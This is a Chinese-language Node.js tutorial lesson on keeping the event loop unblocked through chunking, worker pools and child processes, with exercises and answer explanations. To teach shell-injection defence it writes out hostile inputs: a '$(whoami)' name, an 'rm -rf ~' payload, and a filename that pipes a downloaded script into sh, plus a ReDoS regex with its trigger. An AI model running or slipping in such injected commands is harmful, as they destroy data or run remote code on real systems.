階段 2：非同步與 event loop · 第 9 課

別卡住 event loop：worker 與子程序

咖啡店的後台加了「每日報表」：老闆按一下，伺服器把當天幾百萬筆訂單算成各品項營收和尖峰時段。上線第一天，老闆一按報表，點餐平板就轉圈圈轉了一秒多，所有客人的訂單都卡住。報表算出來的數字是對的，點餐的程式也沒有改過，兩件看起來無關的事卻綁在一起：報表算多久，所有客人就等多久。

這一課從頭到尾處理這個事故：先弄懂為什麼一份報表能卡住所有人、怎麼用數字證明是它，再用三種方法把報表從客人的路上移開：切成小段、交給另一條執行緒、交給另一個程序。最後你會知道遇到慢的工作該選哪一種。

這課的路線：
  1. 為什麼一份報表會讓所有客人一起卡住？怎麼用數字證明是 event loop 被卡住，而不是資料庫慢？
  2. 除了報表這種自己寫的迴圈，還有哪些看起來普通的一行程式會卡住？
  3. 解法一：報表還在原本的執行緒算，但切成小段，讓點餐插得進來；代價是還是只用一顆 CPU。
  4. 解法二：把報表交給 worker 執行緒算；很多人同時按報表時，用固定大小的 worker pool 排隊。
  5. 解法三：開發票的舊程式不是 JavaScript，用子程序呼叫它，不讓客人姓名變成 shell 指令；最後整理怎麼選。
這課會用到：
  • 第 7 課的 event loop：setImmediate 排到下一輪 loop，microtask 在離開目前這段 callback 前就全部清空；檔案、雜湊這類工作交給預設 4 條的 thread pool。
  • 第 2 課的程序與結束碼：正常結果印 stdout、錯誤印 stderr，結束碼 0 才是成功，SIGTERM 要求程式結束。
  • 第 8 課的事件與 AbortSignal：用 on('事件', 監聽器) 等通知、用 signal 取消等待，結束時要把監聽器拿掉。

為什麼一份報表會讓所有客人一起卡住？

先把事故重現出來。在 learn/ 執行 node check.mjs node 09 建立 work/09/，然後在 work/09 執行 node examples/blocking-server.ts。這個伺服器有兩個網址：/menu 代表客人點餐，什麼都不算、立刻回應；/report 代表老闆按報表，同步算 300 萬筆訂單。另開一個終端機，先送報表，0.2 秒後再點一次菜單：

$ curl localhost:3000/report & sleep 0.2; curl -w 'menu 花了 %{time_total}s\n' localhost:3000/menu
menu ok
menu 花了 1.440128s

伺服器那邊印出：

/report 處理了 1661ms
延遲 max 1670ms、p99 1670ms；ELU 78%
/menu 處理了 0ms

第二行先不用看，下一節解釋。重點是第一行和第三行的對比：/menu 自己只花 0ms，客人卻等了 1.4 秒。這 1.4 秒全部花在排隊：/menu 的請求在 /report 開始算之後才到，一直等到報表算完才被處理。（這台 v24.22.1 實測，數字每次會有些差異。）

為什麼要排隊？因為 Node 執行你寫的 JavaScript 只用一條執行緒。第 7 課看過 event loop 怎麼運作：這條執行緒跑完一段 callback，回到 event loop 看看有什麼新事件（新的連線、到期的計時器、讀完的檔案），再挑下一段 callback 來跑。只要某段 callback 還沒跑完，event loop 就回不來，新事件只能在外面等。

平常這不是問題，因為大多數 callback 都很短。處理一個查訂單的請求，JavaScript 只要做「組好 SQL、送出去」這幾微秒的事，接著就交出執行緒等資料庫回應；等待的這段時間，執行緒去處理別人的請求。所以一個 Node 程序能同時顧上千個連線。

報表不一樣。computeDailyReport 是一個跑 300 萬次的迴圈，中間沒有任何「等」的地方，執行緒從頭到尾都在算，一次也沒有回到 event loop。這種狀態叫做阻塞（blocking）：執行緒被一段同步的程式佔住，計時器不會觸發、新的請求不會被讀進來，所有人一起停住。像只有一個收銀台的咖啡店，店員在幫一位客人算一整年的帳，後面排隊的人連「一杯美式」都點不了。

從這裡可以把後端的工作分成兩種：

  • I/O 密集（I/O-bound）：時間主要花在等待，例如查資料庫、呼叫外部 API、讀檔案。等待時執行緒是空的，Node 很擅長這種工作。
  • CPU 密集（CPU-bound）：時間主要花在計算，例如報表、壓縮、加密、解析大檔。計算時執行緒是滿的，在 Node 裡會擋住所有人。

所以這個事故的答案已經出來了：報表本身沒錯，錯在它在唯一那條執行緒上一口氣算完。要修，就是讓報表不要一口氣佔住這條執行緒：要嘛讓它算一段就讓出來，要嘛把它搬到別的執行緒或程序去算。後面三種解法就是這兩個方向。

不過在動手修之前，還有一個問題：這次是我們自己重現才知道是報表。正式環境裡，客服只會說「網站有時候會卡」，你怎麼知道是 event loop 被卡住，而不是資料庫慢、網路慢？

怎麼證明是 event loop 被卡住，而不是資料庫慢？

兩種情況在使用者眼裡都是「慢」，但原因和修法完全不同：資料庫慢，要去看查詢和索引；event loop 被卡住，要找出佔住執行緒的那段程式。所以要有一個只在「執行緒被佔住」時才會升高的數字。Node 的 node:perf_hooks 提供兩個，剛才範例伺服器每 2 秒印一次的就是它們。

event loop 延遲：計時器晚了多久

想法是這樣：排一個 10ms 後觸發的計時器。如果執行緒是空的，它會準時在 10ms 觸發；如果執行緒被報表佔住 1.6 秒，它要等報表算完、event loop 回來才觸發，就會晚 1.6 秒。計時器晚了多久，就是執行緒被佔住多久。這叫做 event loop 延遲（event loop delay）。

注意它只對「執行緒被佔住」有反應。查資料庫等了 3 秒時，執行緒是空的，計時器照樣準時，延遲不會升高。這正是區分兩種「慢」的關鍵。

monitorEventLoopDelay() 幫你做這件事：每隔 resolution 毫秒（預設 10）排一次計時器，記錄它每次實際晚了多久。量到的值很多，所以它不是存成一個數字，而是存成直方圖（histogram）：統計每個延遲值出現了幾次，之後可以問「最大是多少」「大多數落在哪裡」。值的單位是奈秒，除以 1e6 變毫秒。

從直方圖要看兩個數字：

  • max：這段時間最糟的一次。上面的 1670ms 就是 /report 卡住的時間。
  • percentile(99)：第 99 百分位，常寫成 p99，意思是 99% 的取樣都比它小。只看平均會被大量正常的取樣稀釋，看不出偶爾的卡頓；只看 max 又可能被單一次意外影響。p99 告訴你「最慢的那 1% 有多慢」，是監控最常用的指標。

event loop 使用率：執行緒有多忙

延遲回答的是「卡了多久」，另一個問題是「整體有多忙」。event loop 使用率（event loop utilization，ELU）是 event loop 有多少比例的時間在跑 JavaScript，而不是空著等事件。performance.eventLoopUtilization() 回傳累計的數字；把前一次的結果傳進去，就能算出這一段時間的使用率。上面的 78% 代表那 2 秒裡有 78% 的時間執行緒在算。接近 100% 代表這個程序的 CPU 已經不夠用了：就算沒有單一次很長的卡頓，所有請求也都在搶時間。

兩個數字合起來的量法：

import { monitorEventLoopDelay, performance } from 'node:perf_hooks'

const delay = monitorEventLoopDelay({ resolution: 10 })
delay.enable()
let last = performance.eventLoopUtilization()
setInterval(() => {
  const now = performance.eventLoopUtilization()
  const elu = performance.eventLoopUtilization(now, last).utilization
  last = now
  console.log(delay.max / 1e6, delay.percentile(99) / 1e6, elu)
  delay.reset()
}, 2_000)

每 2 秒印一次，印完 reset() 清空直方圖，下一次印的就是下一個 2 秒的狀況。last 記住上一次的 ELU，讓每次算的都是「這 2 秒」的使用率，而不是從啟動到現在的平均。

回到判斷：延遲的 max 或 p99 衝到幾百毫秒以上、ELU 又很高，就是 event loop 被同步的工作佔住；延遲正常、只有某支 API 慢，就是那支 API 在等外部的東西。正式環境會把這兩個數字送進監控系統，延遲超過幾十毫秒就告警。知道「是 event loop 被卡住」之後，要找出是哪一段程式在佔 CPU，是 第 23 課教的 profile。

報表是我們自己寫的大迴圈，算它很慢不意外。但監控告警時，兇手不一定是這麼明顯的迴圈：有些卡住 event loop 的程式，看起來只是很普通的一行。

除了報表，還有哪些普通的一行程式會卡住？

判斷標準跟報表一樣：只要一段程式在執行緒上同步跑很久、中間不回到 event loop，就會卡住所有人。下面幾種在日常程式碼裡很常見，而且本機資料少時都很快，上線後才出事：

來源例子怎麼辦
CPU 迴圈報表、排序幾百萬筆、圖片處理本課的三種解法
*Sync APIfs.readFileSync、crypto.pbkdf2Sync、zlib.gzipSync、execSync處理請求時一律用非同步版本，工作會交給 thread pool 或作業系統。這台 pbkdf2Sync 跑 60 萬次約 0.2 秒，期間全部停住
超大 JSON36MB 的訂單陣列：JSON.stringify 約 0.28 秒、JSON.parse 約 0.32 秒（本機實測）限制請求大小、分頁，或用 stream（第 16 課）
正規表示式下面的 ReDoS改寫規則、限制輸入長度（第 25 課）

*Sync API 是最常見的一種。Node 大多數 I/O API 都有兩個版本：非同步版本把工作交給 thread pool 或作業系統，JavaScript 執行緒先去做別的事；Sync 版本則讓 JavaScript 執行緒自己停在那裡等結果。等的時間再短，乘上每個請求，就是所有人一起等。

這不代表 Sync 不能用。啟動階段用 readFileSync 讀設定沒關係：那時伺服器還沒開始收請求，沒有人在等。規則是「處理請求的路徑上不要有同步的重工作」。

超大 JSON 容易被忽略，因為 JSON.parse 和 JSON.stringify 看起來只是一個函式呼叫。但它們是同步的，要逐字讀過或組出整份字串，資料越大花越久，期間一樣不回到 event loop。

正規表示式是最隱密的一種。正規表示式（TypeScript 課第 5 課）的引擎遇到「好幾種切法都可能符合」的規則時，會一種一種試，叫做回溯（backtracking）。大多數規則要試的組合很少；但有些規則在特定輸入下，要試的組合數會指數成長，叫做災難性回溯。有人故意送這種輸入讓伺服器卡死，叫做 ReDoS（Regular expression Denial of Service，用正規表示式造成的阻斷服務）。執行 node examples/redos.ts：

/^(\w+\s?)*$/ 對 'a'.repeat(n) + '!'
22 個 a：27.3ms
24 個 a：103.0ms
26 個 a：464.4ms
28 個 a：2422.3ms

只是 29 個字元的字串，卡住超過一秒，每多兩個字母時間約變四到五倍。問題出在 (\w+\s?)*：\s? 可以不出現，所以 aaaa 可以切成 a|aaa、aa|aa、a|a|a|a…，結尾的 ! 讓每一種切法都失敗，引擎只好全部試完。字串越長，切法越多。而這段時間跟報表一樣，是在唯一那條執行緒上同步發生的。

💡 實務上：code review 時先找請求路徑上的同步重工作
這類問題很少在開發時被發現：本機只有幾十筆訂單，JSON.parse 一整份、readFileSync 都很快，上線資料變多才開始卡。資深工程師 review 時會順著 handler 看：有沒有 *Sync、有沒有一次撈全部資料再排序或組大 JSON、有沒有拿使用者輸入去跑正規表示式。從網路上複製來的正規表示式要特別小心，套用在 email、網址這種使用者可以亂填的欄位前，先限制輸入長度。客服回報「整個網站偶爾卡一兩秒」而不是「某一頁很慢」時，就該先懷疑 event loop 被卡住。

上面這些多半可以靠「換非同步版本」「限制大小」「改寫規則」解決。報表不行：幾百萬筆訂單就是要算，換不掉。下一步回到報表本身，從最簡單的解法開始：不搬到別處，只讓它別一口氣算完。

解法一：報表能不能算一段就讓出來，讓點餐插得進來？

第一節說過，阻塞的原因是報表的迴圈一次都沒有回到 event loop。那最直接的修法是：迴圈每處理一段，就主動回到 event loop 一次，讓排隊的請求被處理，再回來算下一段。這叫做分段處理（partitioning）。報表還是在原本的執行緒算，總時間差不多，但不再一口氣佔住。

關鍵是「回到 event loop」要用對東西。第 7 課學過，setImmediate 的 callback 排在下一輪 loop 的 check phase。await 一個 setImmediate 時，目前這段程式先停下來，等 event loop 走到 check phase 才被叫醒；之後每一段都在 check phase 裡排下一個 setImmediate，要等下一輪才會執行，所以兩段之間 event loop 會經過計時器和網路 I/O 的 phase。客人的 /menu 請求就在這中間被讀進來、處理掉。

import { setImmediate as nextLoop } from 'node:timers/promises'

for (let start = 0; start < items.length; start += 5_000) {
  // 處理 items[start] 到 items[start + 4999]
  await nextLoop()   // 讓出：其他工作在這裡插進來
}

為什麼加 async 或 await 一個 Promise 不算讓出？

這是分段處理最常寫錯的地方，有兩種誤會：

  • 加 async 不會讓計算移到背景：async function 只是讓函式回傳 Promise，裡面的程式還是在呼叫的當下、在同一條執行緒上同步跑，直到第一個 await。如果裡面沒有 await，整個迴圈跑完才回傳，跟沒加一樣卡。
  • await Promise.resolve() 和 queueMicrotask 不算讓出：它們排的是 microtask。第 7 課教過，Node 在離開目前這段 callback、進入下一個 phase 之前，會把 microtask 全部跑完。所以迴圈 await 一個 microtask 後，馬上就在同一段時間裡被叫醒、繼續下一段；event loop 根本沒機會走到處理計時器和網路的 phase。迴圈每段都這樣做，整個迴圈還是一口氣跑完，客人一樣輪不到。

判斷方法：讓出用的東西，要能讓 event loop 走完一輪。setImmediate 可以，microtask 不行。

一段要切多大？

這是一個取捨。段太大，其他請求要等一整段算完才插得進來，卡頓只是變短，沒有消失。段太小，讓出本身的成本會比工作還多：每次 await 一個 setImmediate 要十幾微秒。這台電腦每筆都讓出一次時，40 萬筆從 0.2 秒變成快 7 秒。常見的目標是每段幾毫秒：對客人來說幾毫秒的等待感覺不到，對報表來說讓出的次數也不會多到拖慢整體。

分段處理的好處是不用多開任何東西，改幾行就能讓點餐恢復正常。代價是它還是只用一顆 CPU：報表算得一樣久，只是不再擋住別人。如果同時有十個店長按報表，十份報表會輪流用同一條執行緒，每段之間客人雖然插得進來，但執行緒大部分時間都在算報表，ELU 會一直很高，所有請求都變慢。要讓報表真的「在別處算」，就要用到另一顆 CPU。

解法二：怎麼把報表交給另一條執行緒算？

電腦通常有好幾顆 CPU 核心，但 Node 執行你的 JavaScript 只用一條執行緒，其他核心大多閒著。node:worker_threads 讓你在同一個程序裡開另一條執行緒跑 JavaScript，叫做 worker。每個 worker 有自己的 V8、自己的 event loop、自己的記憶體，可以跑在另一顆 CPU 上。報表交給 worker 算，主執行緒只負責收請求、把工作交出去、等結果回來回應，算的那 1.6 秒主執行緒都是空的。

先看最小的例子，確認主執行緒和 worker 怎麼溝通。執行 node examples/worker-hello.ts：

import { Worker, isMainThread, parentPort, threadId, workerData } from 'node:worker_threads'

if (isMainThread) {
  const order = { item: '拿鐵', qty: 2 }
  const worker = new Worker(new URL(import.meta.url), { workerData: order })
  worker.on('message', msg => console.log('主執行緒收到：', msg))
  worker.on('error', err => console.error('worker 丟錯：', err.message))
  worker.on('exit', code => console.log('worker 結束，結束碼', code))
  order.qty = 99   // worker 拿到的是複製品，不受影響
  console.log('主執行緒 threadId', threadId)
} else {
  parentPort!.postMessage({ from: threadId, got: workerData })
}
主執行緒 threadId 0
主執行緒收到： { from: 1, got: { item: '拿鐵', qty: 2 } }
worker 結束，結束碼 0

這段程式由上到下發生的事：

  • new Worker(檔案)：開一條新執行緒，在裡面從頭執行指定的檔案。這裡指定的是同一個檔案，所以它被執行了兩次：主執行緒裡 isMainThread 是 true，負責建立 worker；worker 裡是 false，負責回訊息。new URL(import.meta.url) 就是目前這個檔案本身（import.meta.url 見第 4 課）。如果 worker 的程式放在另一個檔案，就寫 new URL('./x.ts', import.meta.url)：路徑相對於程式檔所在的資料夾，跟從哪裡執行 node 無關。
  • workerData：啟動時傳一份資料過去；postMessage／on('message')：之後雙向互傳訊息。worker 裡用 parentPort 跟主執行緒說話。
  • threadId：主執行緒是 0，每個 worker 有自己的編號。
  • on('error')、on('exit')：worker 出錯或結束時通知主執行緒，輸出最後一行就是 exit。這兩個事件在後面的「worker 出錯或結束時」一節詳細說明。

輸出裡有一個細節：主執行緒在建立 worker 之後把 qty 改成 99，worker 收到的卻還是 2。這指向 worker 最重要的一個規則。

資料是複製過去的：要傳什麼給 worker？

worker 有自己的記憶體，讀不到主執行緒的變數，兩邊只能傳訊息。訊息會用結構化複製（structured clone）整份複製一份過去，規則和 structuredClone() 相同（TypeScript 課第 2 課）。所以 worker 拿到的是建立當下的複製品，之後主執行緒怎麼改都影響不到它；函式、class 的方法也傳不過去。

複製會花時間，而且是在主執行緒上做。這台電腦複製 60 萬筆訂單約 0.6 秒，比算報表本身還久。如果把整天的訂單塞進訊息傳給 worker，主執行緒光是複製就又卡住了，等於白搬。

所以傳給 worker 的東西要小：傳「哪一天」，讓 worker 自己去讀那天的訂單，算完只傳回彙總好的報表。練習的 report-worker.ts 就是這樣設計的。

worker 出錯或結束時，主執行緒怎麼知道？

把報表搬到 worker 之後，報表算到一半出錯，錯誤不會像一般函式那樣 throw 回呼叫端，因為它發生在另一條執行緒上。主執行緒只能透過 worker 物件上的事件知道發生了什麼：

  • 'error'：worker 裡有沒被 catch 的錯誤，worker 會被終止，錯誤以這個事件送到主執行緒。沒人聽 'error' 時，這個錯誤會在主執行緒丟出，整個伺服器跟著掛掉，所以一定要聽。
  • 'exit'：worker 停止時一定會發，不管是正常結束、出錯還是被終止，帶著結束碼：worker 裡呼叫 process.exit(n) 就是 n（只結束那個 worker，不是整個程序），被 terminate() 是 1。這是 worker 的最後一個事件。
  • worker.terminate()：盡快停掉它，回傳 Promise，在 'exit' 時完成。還活著、還在聽訊息的 worker 會讓程序結束不了，所以伺服器關閉時要記得 terminate。

到這裡，最直覺的寫法是：每個報表請求 new Worker()，收到結果就 terminate()。只有老闆一個人按報表時，這樣完全沒問題。但如果全台分店的店長在月初同時按報表呢？

很多人同時按報表時，worker 該開幾個？worker pool

每個請求都 new Worker() 有兩個代價。第一，開 worker 不便宜：每個都要啟動一個新的 V8、載入模組，要花幾十毫秒和好幾 MB 記憶體。第二，數量沒有上限：同時來 500 個請求就開 500 條執行緒，記憶體爆掉；而 CPU 只有那幾顆，500 條執行緒同時算，只會互相搶 CPU，每一份都更慢。

正確做法是 worker pool：啟動時開固定數量的 worker，重複使用；全部在忙時，新的工作排隊等有空的 worker。

這就是 TypeScript 課第 9 課的工作池：固定數量的工人輪流從佇列拿工作。放到 worker 上，多了兩件事要處理：

  • 用編號對回結果：一個 worker 會先後處理很多份報表，回傳的只是一則訊息，主執行緒要知道它是哪個請求的答案。所以送出時帶 id，回來時看 id 找到原本那個請求的 Promise，resolve 它。
  • worker 會當掉：上一節的 'error'、'exit' 在這裡派上用場。worker 當掉時，它手上那份報表永遠不會有結果，要 reject 讓那個請求回錯誤；再補一個新的 worker，不然 pool 會越來越小，最後一個 worker 都不剩，所有報表請求都卡住。

pool 該開幾個？CPU 密集的工作，同時在算的數量超過 CPU 核心數就沒有幫助，只會互搶。os.availableParallelism() 回傳可用的核心數（第 24 課），通常留一顆給主執行緒收請求。

練習 2 就是寫這個 pool。正式專案通常直接用成熟的套件 piscina，它還處理了取消、逾時、記憶體上限；自己寫一次，你才知道它替你做了什麼、出問題時該看哪裡。

💡 實務上：先確認真的是 CPU 在忙，再上 worker
工作中最常放進 worker 的是算大報表、匯出 Excel、解析使用者上傳的大 CSV 這類每次都要算、而且算很久的事。但大多數「API 很慢」其實是在等資料庫或外部服務，這時 ELU 不高，開 worker 一點用都沒有，該去看查詢和索引。真的要用時，直接上 piscina 這類套件，把 pool 大小、佇列上限、逾時設好；佇列沒有上限的話，尖峰時請求只會越積越多，記憶體跟著漲。上線後要繼續看 event loop 延遲有沒有真的降下來，確認改對地方。

報表的問題到這裡解決了。但 worker 只能跑 JavaScript。後台另一件重工作是開發票：發票由別的團隊留下的舊程式產生，它是一支獨立的命令列程式，不能 import、也不能改。這種工作要用第三種方法。

解法三：開發票的舊程式不是 JavaScript 函式，怎麼安全地呼叫它？

產生 PDF 的工具、影像轉檔的 ffmpeg、別的團隊留下的舊程式，都是獨立的執行檔，你在終端機打指令執行它們。在 Node 裡做同一件事，是用 node:child_process 啟動另一個程序，叫做子程序（child process）。子程序跟你的伺服器是兩個程序，有各自的記憶體，也可以跑在別的 CPU 上；它當掉不會讓你的伺服器程序跟著當掉；但兩者在同一台機器上，CPU 和記憶體還是共用的（下面的實務提醒會談到）。

啟動子程序有四個 API，差別在「怎麼拿輸出」和「經不經過 shell」：

API做什麼什麼時候用
spawn(檔案, 參數陣列)啟動程式，stdout／stderr 是 stream，一邊跑一邊讀輸出很大或要即時處理
execFile(檔案, 參數陣列, 選項, callback)啟動程式，等它結束，把輸出收集成字串輸出不大、要拿到整份結果（最常用）
exec(一整行指令)把字串交給 shell（/bin/sh）解讀後執行幾乎不要用在有使用者輸入的地方
fork(模組, 參數陣列)啟動另一個 Node 程序，多一條程序間通訊（IPC，inter-process communication）管道，雙方用 send／on('message') 傳訊息Node 寫的工作要完全隔離；第 24 課的 cluster 就是用它

開發票的舊程式印一行 JSON 就結束，輸出很小，用 execFile 最適合。但表上的 exec 看起來更方便：直接寫一整行指令就好。為什麼說它幾乎不要用？

為什麼不能用 exec 把客人姓名串進指令？shell 注入

開發票要把客人姓名傳給舊程式，而姓名是客人自己填的。shell 是解讀指令的程式，就是你在終端機打字時負責理解那行字的東西。它會把空白當成參數的分隔、把 ; 當成「接著執行下一個指令」、把 $() 和反引號當成「先執行裡面的指令，再把結果放進來」。exec 把整行字串交給 shell 解讀，所以使用者輸入如果被串進這行字串，裡面的符號就會被當成指令執行，叫做 shell 注入（command injection）。執行 node examples/shell-vs-args.ts（$(whoami) 只會印出帳號名稱，不會造成破壞）：

const name = '小明 $(whoami)'
exec(`echo 你好，${name}`, …)           // exec     → 你好，小明 ken
execFile('echo', ['你好，', name], …)   // execFile → 你好， 小明 $(whoami)

exec 真的執行了 whoami，把帳號名稱放進輸出。換成 "; rm -rf ~; echo " 就不好笑了。直覺的修法是用引號把姓名包起來，但擋不住：名字裡自己帶一個引號，就把你的引號提早關掉，後面的內容又回到 shell 的解讀範圍。

正確做法是根本不經過 shell：execFile／spawn 加參數陣列。陣列的每個元素原封不動交給程式當成一個參數，沒有 shell 在中間解讀，裡面的 ;、$()、引號都只是普通的字。輸出裡 execFile 印出的就是原本的 $(whoami) 這幾個字。另外不要開 shell: true 選項，那等於又把參數交給 shell，回到 exec 的問題。

姓名安全了，但舊程式本身也不可靠：它可能卡住不結束，也可能失敗。

舊程式卡住或失敗時怎麼辦？逾時、結束碼、stderr

外部程式是黑盒子，呼叫它的程式碼要自己處理三種狀況：

import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
const execFileAsync = promisify(execFile)

try {
  const { stdout } = await execFileAsync(process.execPath, [tool, name], { timeout: 2_000 })
  return JSON.parse(stdout)
} catch (err) {
  // err.code：結束碼；err.killed：是不是被我們終止的；err.stderr：程式說的原因
}
  • 卡住：逾時。timeout 預設是 0，意思是永遠等；舊程式卡住，開發票的請求就永遠不回。設了之後，超過時間就送 killSignal（預設 SIGTERM）終止它，Promise 會 reject。也可以傳 signal（第 8 課的 AbortSignal），請求被取消時一起終止子程序。
  • 失敗：結束碼。程式用結束碼告訴呼叫它的人成功了沒，0 才是成功（第 2 課）。promisify 過的 execFile 在結束碼非 0 時 reject，錯誤物件上有 code、stdout、stderr。沒檢查的話，失敗時拿到空的 stdout 還會當成功。
  • 失敗的原因：stderr。程式失敗時通常把原因印在 stderr，例如「未知的品項：珍珠奶茶」。要把它放進錯誤訊息或 log，不然只看到「失敗了」，不知道怎麼修。

範例用 process.execPath 當要執行的檔案：它是目前這個 node 的完整路徑。啟動 Node 寫的程式時用它，不要依賴 PATH 上的 node，子程序的 Node 版本才會跟伺服器一樣。

最後回到這課的主題：伺服器裡不要用 execSync／spawnSync。它們是 *Sync API，會讓 JavaScript 執行緒一直停著等子程序結束，等於把卡住的問題又搬回 event loop。

💡 實務上：呼叫外部程式要跟維運一起想
咖啡店要寄 PDF 收據、把商品照片轉檔，常會呼叫現成的命令列工具。容易忘的是部署：程式在你電腦上能跑，是因為你裝過那個工具，正式環境的機器也要裝，而且版本要一致。另外要限制同時跑幾個，一次啟動一百個轉檔程序，整台機器的 CPU 和記憶體都會被吃光，這時子程序也需要像 worker pool 一樣排隊。資安 review 時會特別搜尋 exec( 和 shell: true，看有沒有使用者輸入被串進指令字串。

三種解法都看過了。下次遇到慢的工作，不一定是報表或發票，要怎麼決定用哪一種？

遇到慢的工作，該選哪一種？

先別急著選解法。前面每一節都有一個共同的前提：確定是 CPU 在卡。所以判斷順序是：

  1. 先量：看 event loop 延遲和 ELU（第二節），需要時用 第 23 課的 profile 找出是哪段程式。延遲不高、只有某支 API 慢，問題在等待，worker 救不了。
  2. 先少算：能不能不要每次都算？報表可以快取起來、分頁只算需要的部分，或讓資料庫先彙總好。不用算的工作最快。
  3. 還是要算，再選表上最簡單能解決的那一個：
做法適合代價
分段處理偶爾一次、幾百毫秒的計算只用一顆 CPU；每段之間要能暫停
worker pool經常發生的 CPU 密集工作（報表、壓縮、雜湊）傳資料要複製；要處理 worker 的錯誤和結束
子程序外部程式、要隔離記憶體或當掉的風險啟動比 worker 更慢；要處理逾時、結束碼、注入
獨立服務或佇列要跑好幾分鐘、失敗要重試、要跨機器（NestJS 課第 20 課、PostgreSQL 課第 33 課）多一套系統要維運；結果要非同步通知

最後一列是這課沒有實作、但要知道邊界的做法。worker 和子程序都還是活在這個伺服器程序底下：部署重啟或程序當掉時，算到一半的工作就沒了，也不會自動重試。月底結算這種要跑好幾分鐘、不能遺失的工作，要放進佇列，由另外的程序去算。同樣地，worker 只解決「CPU 卡住」，不解決「一個程序當掉全部停擺」，那要靠多個程序（第 24 課）。

用這個順序回頭看咖啡店的每日報表：先量到 event loop 延遲衝到 1.6 秒，確認是 CPU；報表每天都有人按、每次都要算幾百萬筆，屬於「經常發生的 CPU 密集工作」，所以用 worker pool；開發票是外部程式，用 execFile 加參數陣列和逾時。

練習

在 learn/ 執行 node check.mjs node 09。三題分別對應三種解法；orders.ts、daily-report.ts、report-worker.ts、server.ts、tools/ 都已經寫好，不用改。測試用隨機的日期和資料，整份跑完約 20 秒。

練習 1：daily-report.ts 的 computeDailyReport(orders) 一口氣同步算完。在 report-async.ts 寫 computeDailyReportAsync(orders)：結果要和同步版完全一樣，但計算期間 event loop 要能回應。用 daily-report.ts 匯出的 createTally()、addOrder(tally, order)、finishReport(tally) 自己寫迴圈，切成小段，每段之間讓出。

測試用 30–40 萬筆隨機訂單，旁邊跑一個每輪 event loop 都記一次的 setImmediate，數出你每段一口氣處理了幾筆：最大的一段不能超過 2 萬筆（不然那段時間誰都動不了），平均每段至少 100 筆（每筆都讓出，讓出的成本會比計算還多）。最後一段不滿也要算到。

練習 2：在 report-pool.ts 寫 createReportPool({ size })，回傳 { run(job), close() }。report-worker.ts 的約定寫在檔案開頭：送 { id, job }，回 { id, report } 或 { id, error }。要求：

  • 一建立就開 size 個 worker 並重複使用；全部在忙時排隊，先來先做。
  • 用 id 把回傳的訊息對回那個工作：report 就 resolve，error 就 reject（只有那個工作失敗）。
  • worker 意外結束（'error'、'exit'）時，它手上的工作 reject，並補一個新的 worker，之後的工作照常。
  • close() 終止所有 worker，等它們結束。

測試把你的 pool（size 2）交給 server.ts，同時送 6 個 /reports/daily 再打 /health：/health 要在報表全部算完之前回應，6 份報表正確，threadId 是你開的 worker，而且剛好 2 條。接著先送一個大工作、再送一個小工作（小的先算完，各自要拿到自己的報表），讓讀取訂單丟錯（那個請求 500、其他正常），再讓 worker process.exit(1)（那個請求 500，之後 4 份報表仍要用 2 條執行緒算完）。最後另開一個程序 run 一次再 close()，程序要自己結束。寫好之後可以執行 node server.ts，用 curl localhost:3000/reports/daily?day=3 試試看。

練習 3：invoice.ts 的 createInvoice(customerName, items) 要呼叫舊程式 tools/legacy-invoice.ts（用法寫在它的開頭），回傳它印出的 JSON。同事寫的版本能動，但有三個問題，全部修好：

  • 客人姓名可能有空白、引號、$()、反引號：外部程式要收到一模一樣的名字，而且什麼指令都不能被執行。
  • 外部程式超過 2 秒沒結束，要終止它並 reject。
  • 結束碼非 0 時要 reject，錯誤訊息要包含它的 stderr（例如「未知的品項：珍珠奶茶」）。

用 process.execPath 執行它；不要另外指定 env 或 cwd，測試會透過環境變數和工作目錄檢查子程序。

練習 4：同事把 function buildReport(orders) 改成 async function buildReport(orders)，內容不變（一個大迴圈，沒有 await），說「這樣就是非同步，不會卡住伺服器了」。對嗎？

✓ async 只改變回傳值（包成 Promise），函式本體在呼叫的當下同步執行，直到第一個 await；沒有 await 就整段跑完才回傳。JavaScript 不會自動把它移到別的執行緒（a 錯）。呼叫端的 await 是等它跑完之後才繼續，迴圈期間一樣卡住（b 錯）。效能大致一樣，問題在阻塞，不在速度（d 錯）。要不卡住就分段讓出，或交給 worker。

練習 5：報表 API 的寫法是「每個請求 new Worker()，算完 terminate()」。平常很順，促銷日 300 個人同時按報表，伺服器記憶體用完被系統砍掉。最好的修正是什麼？

✓ 每個 worker 都有自己的 V8 和記憶體，啟動也要時間；300 個請求就是 300 條執行緒，而 CPU 只有幾顆，多開只會互搶。固定大小的 pool 讓同時在算的數量有上限，多的排隊，記憶體可預期。a 只是讓每個 worker 更容易因為記憶體不足被終止，數量問題還在；c 會讓所有請求被卡住；d 跟數量無關。

練習 6：上傳圖片後要轉成縮圖：exec(`convert ${filename} -resize 200x200 thumb.jpg`)，filename 是使用者上傳時的檔名。最主要的風險和修正是？

✓ 檔名是使用者決定的，可以是 a.jpg; curl 惡意網址 | sh。exec 把整行交給 shell 解讀，就會執行。加引號擋不住（b），檔名自己帶一個引號就跳出去了。execSync 一樣經過 shell，還會卡住 event loop（c）。參數陣列不經過 shell，檔名再奇怪都只是一個參數；記得再加上 timeout。更穩的做法是存檔時改用伺服器自己產生的檔名，使用者給的檔名只拿來顯示。

常見錯誤

  • 處理請求時用 *Sync API：readFileSync、pbkdf2Sync、execSync 期間整個程序停住。啟動階段可以，請求裡一律用非同步版本。
  • 把 microtask 當成讓出：await Promise.resolve()、queueMicrotask、process.nextTick 都在進入下一個 phase 前清空。分段之間要 await 一次 setImmediate。
  • 在執行緒之間傳超大物件：結構化複製在主執行緒上做，幾十萬筆的陣列複製比計算還慢。傳 id 或查詢條件讓 worker 自己讀；二進位資料用 transfer。
  • 沒聽 worker 的 error 和 exit：沒人聽的 error 會讓主執行緒丟錯；worker 當掉時手上的工作永遠不會完成，請求卡住，pool 越來越小。
  • 以為 worker 讀得到主執行緒的變數：兩邊的記憶體是分開的，只能傳訊息，傳過去的是複製品。
  • 用 exec 串字串：使用者輸入會變成 shell 指令。用 execFile／spawn 加參數陣列，也不要開 shell: true。
  • 子程序沒有逾時、不看結束碼：外部程式卡住時請求永遠不回；失敗時拿到空的 stdout 還當成功。設 timeout，結束碼非 0 就 reject，錯誤帶上 stderr。

  • 限制 worker 的記憶體：new Worker(檔案, { resourceLimits: { maxOldGenerationSizeMb: 256 } })，超過時只有那個 worker 被終止。
